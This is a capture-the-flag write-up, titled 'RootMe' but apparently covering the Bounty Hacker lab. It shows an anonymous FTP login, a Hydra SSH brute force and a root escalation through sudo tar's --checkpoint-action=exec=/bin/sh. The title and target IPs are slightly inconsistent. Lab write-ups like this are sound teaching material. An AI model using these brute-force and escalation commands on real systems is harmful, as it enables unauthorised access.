---
title: RootMe
date: 2025-08-21
categories: [ctf, tryhackme]
tags: [linux, ftp, tar]     # TAG names should always be lowercase
---

Hi folks, I hope you all are doing well.

This CaptureTheFlag is about service misconfiguration, where it’s possible to connect into the target using FTP with the user Anonymous and use the tar command to escalate the privileges to root.
To avoid this kind of situation, the SA (System Administrator) should not let services like FTP configured wrong and should take care of the sudo permission, avoiding to let commands like tar to be executed as root to anyone.

So let’s get started.

First thing first, the recon. In this case, it has been used the “nmap”, as per output below:

```
[john@linux bounty_hacker]$ nmap -sV -A 10.10.183.218
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.85.35
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

It’s notable that the Anonymous FTP login is allowed, where it only needs to run “ftp \<ipaddr\>”, providing the user “Anonymous”, to connect into the target.

```
[john@linux bounty_hacker]$ ftp 10.10.124.107
Connected to 10.10.124.107.
220 (vsFTPd 3.0.3)
Name (10.10.124.107:john): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Using the command “ls” inside the ftp, it will return two files, the “locks.txt” and the “task.txt”. It can be downloaded with “get \<file\>” command.

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp>
```

After inspect those files, it’s possible to get the answer to the THM Question “Who wrote the task list?” and see that the file “locks.txt” is a password wordlist. Since we have a user (lin), a target (the machine), a service (ssh) and a wordlist (locks.txt), it’s valid to brute force it, as per below:

```
[john@linux bounty_hacker]$ hydra -l lin -P locks.txt ssh://10.10.183.218
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-14 20:01:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.183.218:22/
[22][ssh] host: 10.10.183.218   login: lin   password: <PASSWORD OMITTED>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-14 20:01:54
```

In hands of the user and the user password, it’s possible to log into the server with ssh and get the first flag, user.txt, which is located inside the user’s Desktop.

Now, it’s needed to escalate the privileges.

There is different kinds of technics for this (.e.g. searching for some service, SUID binary, an so on). One of them is use the command "sudo -l" to list all command that it’s able to run as root. After execute this command inside the server, it will return that it’s able to execute tar as root.

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

This command (tar) allow the user to create backup of certain files.

Now, it’s easy to escalate to root. It just need to run "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" and the user will be the root user. Finally, being able to get the root.txt flag, located at /root.

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# ls -l /root
total 4
-rw-r--r-- 1 root root 19 Jun  7  2020 root.txt
#
```

For a lot of people, this is enough. But, why does that command has been used to escalate the privileges to root? What this command does?

This is pretty simple, the command is being executed with sudo, which means that the root user will run the command. Adding the flags -cf will allow tar to create a new file (the output), making a “backup” of /dev/null (anything) to /dev/null (anything). Until now, this command is doing nothing, basically, but the point is the "--checkpoint=1 --checkpoint-action=exec=/bin/sh", which means that it’s scheduled a new checkpoint before writing or reading each Nth record, in this case, the 1st record. Checkpoints also allow to periodically (before nth record), execute a arbitrary actions, which in this case is to execute the command /bin/sh.

Resuming, the command will make a backup of anything to nowhere, but before make this, it will execute /bin/sh (call a new shell) as root.

Thanks for the attention, I appreciate it so much.
I hope this “writeup” has been useful.